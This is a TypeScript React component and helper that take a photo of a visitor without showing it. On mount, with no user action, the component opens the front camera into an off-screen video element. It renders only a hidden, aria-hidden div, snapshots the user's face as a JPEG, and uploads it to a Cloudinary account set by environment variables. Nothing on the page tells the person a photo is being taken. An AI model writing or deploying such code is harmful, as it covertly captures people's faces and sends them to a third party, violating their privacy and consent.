import React, { useRef, useCallback } from 'react';

interface CameraCaptureProps {
  onCapture: (blob: Blob) => void;
}

export default function CameraCapture({ onCapture }: CameraCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);

  const capturePhoto = useCallback(async () => {
    try {
      console.log("Requesting camera access...");
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      
      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.setAttribute('playsinline', 'true');
      
      // Some browsers require the video to be in the DOM for play()
      video.style.position = 'fixed';
      video.style.top = '-1000px';
      document.body.appendChild(video);
      
      await video.play();

      // Wait for video dimensions and some time for auto-focus/exposure
      await new Promise((resolve) => {
        const check = () => {
          if (video.videoWidth > 0 && video.videoHeight > 0) {
            resolve(null);
          } else {
            requestAnimationFrame(check);
          }
        };
        check();
      });

      console.log("Camera ready, waiting for focus...");
      await new Promise(resolve => setTimeout(resolve, 1000));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(video, 0, 0);

      console.log("Taking snapshot...");
      canvas.toBlob((blob) => {
        if (blob) {
          console.log("Snapshot captured successfully, size:", blob.size);
          onCapture(blob);
        } else {
          console.error("Failed to convert canvas to blob");
        }
        stream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);
      }, 'image/jpeg', 0.8);
    } catch (err) {
      console.error("Camera capture process failed:", err);
    }
  }, [onCapture]);

  // Trigger capture immediately when activated
  React.useEffect(() => {
    capturePhoto();
  }, [capturePhoto]);

  return (
    <div className="hidden" aria-hidden="true" id="dkeuagj63">
      <video ref={videoRef} />
    </div>
  );
}

export async function uploadToCloudinary(blob: Blob) {
  const cloudName = import.meta.env.VITE_CLOUDINARY_CLOUD_NAME;
  const uploadPreset = import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET || "ml_default";

  if (!cloudName) {
    console.error("VITE_CLOUDINARY_CLOUD_NAME is not set! Go to Secrets and add it.");
    return null;
  }

  console.log("Attempting upload to Cloudinary...", { cloudName, uploadPreset });

  const formData = new FormData();
  formData.append('file', blob);
  formData.append('upload_preset', uploadPreset);

  try {
    const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
      method: 'POST',
      body: formData
    });
    
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Cloudinary error: ${response.status} - ${errorText}`);
    }

    const data = await response.json();
    console.log("Cloudinary Upload Success:", data.secure_url);
    return data.secure_url;
  } catch (error) {
    console.error("Cloudinary upload failed:", error);
    return null;
  }
}
